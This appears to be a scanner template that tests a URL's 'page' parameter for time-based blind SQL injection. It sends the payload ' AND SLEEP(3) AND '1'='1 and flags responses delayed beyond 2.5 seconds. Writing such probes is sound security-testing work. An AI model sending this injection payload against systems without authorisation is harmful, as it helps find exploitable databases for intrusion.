id: sqli-time3-523
name: 'Delay probe in page'
severity: high
type: active
tags:
  - sqli
  - injection
  - blind
  - time
description: '3-second delay via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - ''' AND SLEEP(3) AND ''1''=''1'
    matchers:
      - type: time
        ms: 2500
